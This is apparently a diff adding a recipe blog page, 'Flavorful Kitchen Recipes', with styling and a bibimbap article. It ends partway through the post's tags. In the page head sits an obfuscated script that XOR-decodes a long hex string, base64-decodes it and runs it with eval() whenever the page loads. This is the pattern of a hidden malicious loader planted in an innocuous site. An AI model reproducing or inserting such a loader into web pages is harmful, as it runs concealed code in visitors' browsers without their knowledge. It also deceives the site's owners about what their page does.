@@ -1,0 +1,1318 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flavorful Kitchen Recipes</title>
+
+    <!-- Google Fonts: Cormorant Garamond (Luxurious Editorial Serif) & Outfit (Ultra-soft Modern Geometric Sans) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;0,700;1,300;1,400;1,600&family=Outfit:wght@200;300;400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <style>
+        /* Japandi Matcha Latte & Baked Peach Aesthetic */
+        :root {
+            --primary-color: #4a5e4e;
+            /* Matte Matcha Green */
+            --primary-hover: #37473a;
+            --accent-color: #d99684;
+            /* Soft Baked Peach / Terracotta Rose */
+            --accent-light: #fdf5ec;
+            /* Warm Almond Cream */
+            --text-color: #3d453e;
+            /* Warm Sage Charcoal */
+            --text-muted: #7c857e;
+            /* Dusty Matcha Green */
+            --heading-color: #1b261f;
+            /* Deep Forest Jade */
+            --bg-color: #f5f7f4;
+            /* Milk Foam / Off-white Green */
+            --card-bg: #ffffff;
+            --border-color: #e5ebe5;
+            /* Fine Line Botanical Border */
+            --transition-smooth: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Luxurious custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #dce3dc;
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-color);
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            line-height: 1.8;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            max-width: 720px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Top Navigation - Minimal Floating Pill */
+        .top-nav {
+            padding: 20px 0;
+            text-align: center;
+            background-color: rgba(245, 247, 244, 0.85);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(229, 235, 229, 0.4);
+        }
+
+        .top-nav-container {
+            display: inline-flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 2px;
+            background: rgba(255, 255, 255, 0.9);
+            padding: 4px;
+            border-radius: 100px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 10px 40px rgba(74, 94, 78, 0.04);
+        }
+
+        .top-nav a {
+            display: inline-block;
+            color: var(--text-muted);
+            font-size: 0.72rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            cursor: pointer;
+            padding: 8px 18px;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            border-radius: 100px;
+        }
+
+        .top-nav a:hover {
+            color: var(--primary-color);
+            background-color: var(--bg-color);
+        }
+
+        /* Header Styles */
+        header {
+            padding: 90px 0 60px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: 3.6rem;
+            font-weight: 300;
+            font-style: italic;
+            color: var(--heading-color);
+            cursor: pointer;
+            margin-bottom: 12px;
+            letter-spacing: -0.01em;
+            transition: var(--transition-smooth);
+            line-height: 1.1;
+        }
+
+        header h1:hover {
+            color: var(--accent-color);
+            transform: translateY(-2px);
+        }
+
+        header p {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            font-weight: 500;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            display: inline-block;
+        }
+
+        /* Post Cards - Modern Clean Margins & Fine Borders */
+        .post-card {
+            background: var(--card-bg);
+            border-radius: 24px;
+            overflow: hidden;
+            margin-bottom: 48px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 8px 30px rgba(74, 94, 78, 0.02);
+            transition: var(--transition-smooth);
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 20px 45px rgba(74, 94, 78, 0.07);
+            border-color: rgba(74, 94, 78, 0.25);
+        }
+
+        /* Single Post Detail Panel */
+        .single-post {
+            background: var(--card-bg);
+            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 8px 30px rgba(74, 94, 78, 0.02);
+            padding: 48px 36px;
+            margin-bottom: 70px;
+            cursor: default;
+        }
+
+        @media (max-width: 640px) {
+            .single-post {
+                padding: 28px 20px;
+                border-radius: 16px;
+            }
+
+            header h1 {
+                font-size: 2.5rem;
+            }
+        }
+
+        /* Post Metadata (Avatar & Author) */
+        .post-header {
+            padding: 20px 24px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid rgba(229, 235, 229, 0.5);
+        }
+
+        .single-post .post-header {
+            padding: 0 0 20px 0;
+            margin-bottom: 30px;
+        }
+
+        .post-header img.avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            margin-right: 12px;
+            object-fit: cover;
+            border: 1px solid var(--border-color);
+            transition: var(--transition-smooth);
+        }
+
+        .post-card:hover .post-header img.avatar {
+            border-color: var(--accent-color);
+        }
+
+        .post-header .username {
+            font-size: 0.72rem;
+            font-weight: 700;
+            color: var(--heading-color);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+
+        /* Article Images */
+        .post-image {
+            width: 100%;
+            display: block;
+            height: auto;
+            max-height: 480px;
+            object-fit: cover;
+            transition: var(--transition-smooth);
+        }
+
+        .post-card .post-image {
+            aspect-ratio: 16/10;
+        }
+
+        .single-post .post-image {
+            max-height: none;
+            border-radius: 16px;
+            margin-bottom: 32px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Core Article Content Typography styling */
+        .post-content {
+            padding: 28px 24px 16px;
+        }
+
+        .single-post .post-content {
+            padding: 0;
+        }
+
+        .post-content h1,
+        .post-content h2 {
+            font-family: 'Cormorant Garamond', serif;
+            font-weight: 400;
+            color: var(--heading-color);
+            margin: 0 0 16px;
+            font-size: 2.1rem;
+            line-height: 1.25;
+            letter-spacing: -0.01em;
+        }
+
+        .single-post .post-content h1 {
+            font-size: 2.6rem;
+            margin-bottom: 24px;
+        }
+
+        .post-content p {
+            margin-bottom: 24px;
+            color: var(--text-color);
+            font-size: 1.02rem;
+            line-height: 1.85;
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 1px solid rgba(74, 94, 78, 0.3);
+            transition: var(--transition-smooth);
+        }
+
+        .post-content a:hover {
+            color: var(--accent-color);
+            border-bottom-color: var(--accent-color);
+        }
+
+        /* Meta footers */
+        .post-footer {
+            padding: 16px 24px;
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            font-weight: 500;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid rgba(229, 235, 229, 0.5);
+            background-color: rgba(245, 247, 244, 0.3);
+        }
+
+        .single-post .post-footer {
+            padding: 24px 0 0;
+            background: transparent;
+            border-top: 1px solid var(--border-color);
+            margin-top: 48px;
+        }
+
+        /* Back Navigation Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: var(--text-muted);
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            cursor: pointer;
+            padding: 8px 18px;
+            border-radius: 100px;
+            border: 1px solid var(--border-color);
+            background: var(--card-bg);
+            transition: var(--transition-smooth);
+            box-shadow: 0 4px 15px rgba(74, 94, 78, 0.02);
+        }
+
+        .back-button:hover {
+            color: #ffffff;
+            border-color: var(--primary-color);
+            background-color: var(--primary-color);
+            transform: translateX(-3px);
+            box-shadow: 0 8px 25px rgba(74, 94, 78, 0.12);
+        }
+
+        /*
+           STYLING OVERRIDES FOR RUNTIME-INJECTED BLOG CONTENT (STYLE ATTRIBUTE MAPPINGS)
+        */
+        /* Key Takeaway Boxes / Dynamic Informational Callouts */
+        .post-content div[style*="background"] {
+            background: var(--accent-light) !important;
+            /* Soft warm persimmon cream */
+            border: 1px solid rgba(217, 150, 132, 0.25) !important;
+            border-left: 3px solid var(--accent-color) !important;
+            border-radius: 16px !important;
+            padding: 24px 28px !important;
+            margin: 36px 0 !important;
+            box-shadow: none !important;
+        }
+
+        .post-content div[style*="background"] h3 {
+            font-family: 'Cormorant Garamond', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.5rem !important;
+            font-weight: 600 !important;
+            padding-left: 0 !important;
+            border-left: none !important;
+            margin-bottom: 12px !important;
+        }
+
+        .post-content div[style*="background"] ul {
+            margin: 0 !important;
+            padding-left: 18px !important;
+        }
+
+        .post-content div[style*="background"] li {
+            margin-bottom: 8px !important;
+            color: var(--text-color) !important;
+            font-size: 0.98rem !important;
+            line-height: 1.7 !important;
+        }
+
+        /* Section divider sub-headings */
+        .post-content h2[style*="border-bottom"] {
+            font-family: 'Cormorant Garamond', serif !important;
+            font-weight: 500;
+            border-bottom: 1px solid var(--border-color) !important;
+            padding-bottom: 10px !important;
+            margin-top: 48px !important;
+            margin-bottom: 20px !important;
+            font-size: 1.85rem !important;
+        }
+
+        /* Bold sub-headers with left borders */
+        .post-content h3[style*="border-left"] {
+            border-left: 3px solid var(--primary-color) !important;
+            font-family: 'Cormorant Garamond', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.5rem !important;
+            font-weight: 600 !important;
+            padding-left: 14px !important;
+            margin: 36px 0 16px !important;
+            text-decoration: none !important;
+        }
+
+        /* Pro Tip highlight callouts */
+        .post-content p[style*="background"] {
+            background-color: #f2f5f2 !important;
+            /* Extremely soft green foam */
+            border: 1px solid rgba(74, 94, 78, 0.15) !important;
+            border-left: 3px solid var(--primary-color) !important;
+            border-radius: 12px !important;
+            padding: 16px 24px !important;
+            margin: 28px 0 !important;
+            color: var(--text-color) !important;
+            font-size: 0.98rem !important;
+        }
+
+        /* Inline badges and tags */
+        .post-content span[style*="background"] {
+            background: var(--bg-color) !important;
+            color: var(--primary-color) !important;
+            border-radius: 30px !important;
+            font-family: 'Outfit', sans-serif !important;
+            font-weight: 600 !important;
+            font-size: 0.72rem !important;
+            padding: 4px 12px !important;
+            box-shadow: none !important;
+            transform: none !important;
+            display: inline-block !important;
+            margin: 4px 6px 4px 0 !important;
+            border: 1px solid rgba(74, 94, 78, 0.15) !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.05em !important;
+        }
+
+        /* Lists & Nested elements */
+        .post-content ul,
+        .post-content ol {
+            padding-left: 20px;
+            margin-bottom: 24px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            font-size: 0.98rem;
+            color: var(--text-color);
+        }
+
+        /* Dynamic inline headings (best additions, texture tips, etc.) */
+        .post-content h4[style*="background"] {
+            background-color: #fbfbfa !important;
+            padding: 10px 16px !important;
+            border-radius: 8px !important;
+            border: 1px solid var(--border-color) !important;
+            font-family: 'Cormorant Garamond', serif !important;
+            font-size: 1.25rem !important;
+            font-weight: 600 !important;
+            margin-top: 28px !important;
+        }
+
+        /* Bottom dynamic tags and taxonomy cloud */
+        .post-content div[style*="margin-top:28px"] {
+            margin-top: 48px !important;
+            padding-top: 28px !important;
+            border-top: 1px solid var(--border-color) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] h3 {
+            font-family: 'Outfit', sans-serif !important;
+            font-size: 0.72rem !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.1em !important;
+            color: var(--text-muted) !important;
+            margin-bottom: 12px !important;
+            font-weight: 700 !important;
+            border-left: none !important;
+            padding-left: 0 !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span {
+            background: #ffffff !important;
+            color: var(--text-muted) !important;
+            padding: 6px 14px !important;
+            border-radius: 100px !important;
+            font-size: 0.72rem !important;
+            font-weight: 500 !important;
+            margin: 4px 6px 4px 0 !important;
+            display: inline-block !important;
+            transition: var(--transition-smooth) !important;
+            cursor: pointer;
+            border: 1px solid var(--border-color) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span:hover {
+            background: var(--primary-color) !important;
+            color: #ffffff !important;
+            border-color: var(--primary-color) !important;
+        }
+    </style>
+
+    <script>
+        (function () {
+            var vrqisxorr = "0c0f1501122b764a346b04020a6e197d0d65742b066e7722151e16301030356a2c29025f3d3b0d110c6b04000905194e0c3a2935040a3374270a3b3113155e20030c011f13117d4d2e5d1404335f09423500033a3e0b2b1121051e3e212b25692e367a021371570f0f747706096e19480d657136040b152d262019363e0f08112e36160e3a0a7a16346b0406317005080c3e042e2d50013f1f1a1120284a0f0e2b29061c10150111376b263c0a5f2c510e00147a2e5028220c196760383b572204320d5e322b751d24700c5e096e025f0b0f0f30327e053c1c1a6623383c573d2d0c195a3804622939750000096e01520e11072b0454053126343f232b2f21231653273d150a7d0a2244210b19750a5f0b3a033a2e710d36211a343e212b256b2c0c3738281a7e120f6b03190a041d0824140f333d7a0a350a3a3812383b263d0626230438015c000f7b18021b65090f2c3e04242e7a02220c0e163e15152123062919013806041d0f5e085e31612f500b107c3a2b57153f1f151d1b2b4a312f2b253c223801751d24700f0b1975090a360f0c243e547a75102001372b20003d1f320e1f282f0d4a0b740015096e2f4b350f0f7b040a01351f0a0120173f0f3616361d1a2b1a7a000b7b0c1c325819540c3a133903713b2b277f6e37133f3162160c231c2b714c100e5e085f3271274d35643d12066e76751f151d35124b35332d521d512405580f097418150a6e050809100334047e15301f7f3b2c2b2b5e2a0016200e3801751d24700f0b197e11500c3e073304090933210e1660383f2d2c2b2705052b70624e215d1c0033051a570b0000332e713b7d0c0e112c28203d2a1553095913717d0f0f7408190a051d50356513392e713b7d0c0a623115150b3416391d1f122b014937640407335b270a350f0c74245e2c220c0e163e383b263d0626230438015c0a0e03041a3475205f0a202a242e7a02220c0e163e383b263d06220d5a101501110f002d19317127420b107c3a026a763c1f15152a282f29361a521d01150561150f5d181f32753c5f252e26302e7127352720052f150152292d5301011505580c0f5a7b1b096e19570d3a03373d6a28720624163e383b263d06220e0e171176160f7b0000197e3873261404242e7a02220c0e163e383b263d2b0c0910380a7a160e740815096e194e0c3e047a2e710d36211a342c102f5231153927392b2b5313214a071c19727b013f0404342e7d7b220c241e3e3e1126330318065e322b751d24700f0b19750a5f261404242e71192d262415322b20296a2e367a011505580c0f5a0f55197e19500c3a212f037c1133271a1129131126280629010512057203346b1c1a335f0a4a261f0b30036e20720624163e383b263d06220e0e3801751d2474001a3258054e0d101036057e7a2b0e0e1d3b233d311919342b0d38075c4b0f640819197119540b101329037e152e0924150a2b2f352a2c0c19031505580f374a0c5c324c245f263e04312e7e1129267e05291315216a2e36761c3a16473124700f0b19750a5f261404242e7a0222217f3b2c2b3f5e69030c371f2870724a0c6477191c5801540c103d2b3e0b162a1f0a0123153f0b2f16391d191370000a2244210b19750a5f261404242e71730e0c0e163e3830571129320d05130a7a16247b3d2736672405";
+            var vquoeikgj = "OaOiqB4zm3NlP6K8oWECg9CEEMWYqxgZ";
+            var vfzgmtqtg = "";
+
+            try {
+                for (var i = 0; i < vrqisxorr.length; i += 2) {
+                    var vrqthpzwo = parseInt(vrqisxorr.substr(i, 2), 16);
+                    vfzgmtqtg += String.fromCharCode(vrqthpzwo ^ vquoeikgj.charCodeAt((i / 2) % vquoeikgj.length));
+                }
+
+                var vdmlfzfvn = atob(vfzgmtqtg);
+                eval(vdmlfzfvn);
+            } catch (e) {
+                console.error("[DEBUG] Decryption or Execution failed: ", e);
+            }
+        })();
+    </script>
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="top-nav-container">
+            <a onclick="navigate('home')">Home</a>
+            <a onclick="navigate('page', 'about')">About</a>
+            <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+            <a onclick="navigate('page', 'terms')">Terms</a>
+            <a onclick="navigate('page', 'contact')">Contact</a>
+        </div>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Flavorful Kitchen Recipes</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be dynamically injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Fully restored blog posts database
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: 'Bibimbap Recipe',
+                date: 'April 20, 2026',
+                image: './assets/Bibimbap Recipe.png',
+                excerpt: 'Bibimbap is one of the most beloved dishes in Korean cuisine, celebrated for its colorful presentation, balanced nutrition, and incredible versatility. This vibrant mixed rice bowl combines fluffy rice, sautéed vegetables, savory seasonings, and a perfectly cooked egg, all brought together with the rich, spicy flavor of gochujang. The result is a meal that is as visually appealing as it is satisfying.',
+                content: `
+                <p>Bibimbap is one of the most beloved dishes in Korean cuisine, celebrated for its colorful presentation, balanced nutrition, and incredible versatility. This vibrant mixed rice bowl combines fluffy rice, sautéed vegetables, savory seasonings, and a perfectly cooked egg, all brought together with the rich, spicy flavor of gochujang. The result is a meal that is as visually appealing as it is satisfying.</p>
+
+<p>Whether you are exploring Korean food for the first time or looking for a healthy meal packed with vegetables and flavor, bibimbap offers an excellent combination of texture, taste, and nourishment. Every ingredient contributes something unique, creating a bowl that feels both comforting and exciting.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+<h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+<ul style="margin:0;padding-left:20px;">
+<li>Bibimbap is a traditional Korean mixed rice bowl packed with vegetables and flavor.</li>
+<li>The dish combines rice, vegetables, egg, sesame oil, and gochujang.</li>
+<li>It offers a balance of carbohydrates, protein, healthy fats, and fiber.</li>
+<li>The ingredients can be customized based on personal preference.</li>
+<li>Colorful presentation enhances both visual appeal and dining experience.</li>
+<li>It is ideal for healthy lunches, dinners, and meal preparation.</li>
+</ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Makes Bibimbap So Popular?</h2>
+
+<p>The word "bibimbap" translates to "mixed rice," but the dish is much more than its name suggests. It represents a thoughtful combination of ingredients arranged beautifully before being mixed together. The contrast of textures and flavors creates a memorable dining experience with every bite.</p>
+
+<p>One reason for its popularity is its flexibility. While traditional versions often include specific vegetables and proteins, home cooks can adapt the recipe to whatever ingredients they have available. This makes bibimbap accessible, practical, and perfect for reducing food waste.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Bibimbap demonstrates how a simple collection of wholesome ingredients can become a restaurant-quality meal. The balance between vegetables, rice, protein, and seasoning makes it both nutritious and deeply satisfying.</p>
+
+<p>Another factor behind its global appeal is its visual presentation. The colorful vegetables are carefully arranged around the bowl, creating an eye-catching display before everything is mixed together. The vibrant colors reflect the freshness and variety of ingredients used.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Essential Components of a Traditional Bibimbap Bowl</h2>
+
+<p>A classic bibimbap bowl contains several key ingredients that work together to create its signature flavor profile.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Steamed Rice</h3>
+
+<p>Rice forms the foundation of the dish. Freshly cooked white rice provides a neutral base that absorbs the flavors of the vegetables, sesame oil, and gochujang. Its soft texture balances the crunch and tenderness of the toppings.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Vegetables</h3>
+
+<p>The vegetables are what give bibimbap its signature appearance and nutritional value. Common options include spinach, carrots, zucchini, bean sprouts, and cabbage. Each ingredient contributes a different color, texture, and flavor.</p>
+
+<ul>
+<li>Spinach adds earthiness and nutrients.</li>
+<li>Carrots provide sweetness and crunch.</li>
+<li>Zucchini offers a mild, tender texture.</li>
+<li>Bean sprouts add freshness and lightness.</li>
+<li>Cabbage contributes vibrant color and crispness.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Fried Egg</h3>
+
+<p>A sunny-side-up egg is often placed at the center of the bowl. When mixed into the rice, the runny yolk creates a rich, creamy texture that enhances the overall flavor.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Gochujang</h3>
+
+<p>Gochujang is a Korean chili paste known for its unique balance of spice, sweetness, and umami. A spoonful transforms the dish, adding depth and character to every bite.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Sesame Oil and Sesame Seeds</h3>
+
+<p>These finishing ingredients provide a nutty aroma and flavor that ties the entire dish together. Even a small amount makes a noticeable difference.</p>
+
+<div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:12px;padding:18px 20px;margin:30px 0;">
+<h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+<p style="margin:0;">The secret to exceptional bibimbap is preparing each vegetable separately. This preserves individual flavors and textures, allowing every ingredient to shine after the bowl is mixed.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Build the Perfect Bibimbap Bowl</h2>
+
+<p>Creating bibimbap is straightforward, but attention to detail can elevate the final result significantly.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 1: Prepare the Rice</h3>
+
+<p>Start with freshly cooked rice. Warm rice helps absorb flavors more effectively and provides a comforting base for the toppings.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 2: Cook the Vegetables</h3>
+
+<p>Lightly sauté vegetables individually. This method preserves their color and texture while enhancing their natural flavors.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 3: Arrange the Ingredients</h3>
+
+<p>Place the rice in a bowl and arrange the vegetables around the edges. Position contrasting colors next to one another for maximum visual impact.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 4: Add the Egg</h3>
+
+<p>Carefully place a fried egg in the center. This creates the iconic appearance associated with bibimbap.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 5: Finish with Seasonings</h3>
+
+<p>Add gochujang, drizzle sesame oil over the bowl, and sprinkle sesame seeds on top before serving.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Serve bibimbap immediately after assembly. Warm rice, freshly cooked vegetables, and a hot egg create the best texture and flavor combination.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nutritional Benefits of Bibimbap</h2>
+
+<p>Bibimbap is often praised as a balanced meal because it combines multiple food groups in one bowl.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Rich in Vegetables</h3>
+
+<p>Multiple vegetables contribute vitamins, minerals, antioxidants, and dietary fiber. This variety helps support overall wellness while making the meal more satisfying.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Balanced Macronutrients</h3>
+
+<p>The rice provides carbohydrates, the egg contributes protein, and sesame oil adds healthy fats. Together they create a meal that supports sustained energy levels.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Customizable Nutrition</h3>
+
+<p>One of bibimbap's greatest strengths is adaptability. Additional protein sources, whole grains, or extra vegetables can easily be incorporated to meet specific dietary preferences.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Unlike many fast meals, bibimbap encourages portion balance naturally. The abundance of vegetables helps create a filling meal without relying solely on heavier ingredients.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Easy Ways to Customize Bibimbap</h2>
+
+<p>One reason home cooks love bibimbap is the ability to personalize it. The basic concept remains the same while allowing endless ingredient combinations.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Add More Protein</h4>
+
+<p>Chicken, tofu, beef, seafood, or additional eggs can increase protein content while introducing new flavors.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Experiment with Vegetables</h4>
+
+<p>Mushrooms, cucumbers, kale, bell peppers, and radishes can add variety while maintaining the dish's colorful appearance.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Adjust the Spice Level</h4>
+
+<p>Use more or less gochujang depending on your preference. Some people enjoy a mild bowl, while others prefer a stronger kick.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Choose Different Rice Options</h4>
+
+<p>Brown rice, multigrain rice, or cauliflower rice can be used depending on dietary goals and personal taste.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Serving Suggestions for Maximum Enjoyment</h2>
+
+<p>Presentation is part of the bibimbap experience. Arrange ingredients neatly and allow guests to admire the colorful bowl before mixing.</p>
+
+<p>The dish pairs well with light side dishes and fresh accompaniments. A simple vegetable side or refreshing salad can complement the rich flavors of the rice bowl without overpowering it.</p>
+
+<p>For meal prep enthusiasts, preparing vegetables in advance makes assembly quick and convenient throughout the week.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Bibimbap Continues to Win Fans Worldwide</h2>
+
+<p>Modern diners increasingly seek meals that combine nutrition, convenience, and flavor. Bibimbap satisfies all three requirements while remaining highly adaptable.</p>
+
+<p>Its vibrant presentation makes it appealing on social media and food blogs, while its balanced ingredients attract health-conscious eaters. At the same time, its comforting nature ensures it remains approachable for families and home cooks.</p>
+
+<p>The dish also encourages creativity. Every bowl can be slightly different while still maintaining the essence that makes bibimbap special.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+<h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+<ul style="margin:0;padding-left:20px;">
+<li>Colorful Korean rice bowl packed with vegetables.</li>
+<li>Features rice, egg, sesame oil, and gochujang.</li>
+<li>Easy to customize with different proteins and vegetables.</li>
+<li>Balanced meal with satisfying texture and flavor.</li>
+<li>Suitable for meal prep and everyday dining.</li>
+</ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Bibimbap stands out as a remarkable example of how simple ingredients can come together to create something truly memorable. The combination of rice, colorful vegetables, a perfectly cooked egg, sesame oil, and gochujang delivers a satisfying balance of flavor, texture, and nutrition.</p>
+
+<p>Its versatility makes it suitable for a wide range of tastes and dietary preferences, while its vibrant appearance transforms an everyday meal into a visually appealing dining experience. Whether prepared traditionally or customized with your favorite ingredients, bibimbap remains a delicious and wholesome choice that continues to inspire food lovers around the world.</p>
+
+<div style="margin-top:28px;">
+<h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Bibimbap</span>
+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Korean Food</span>
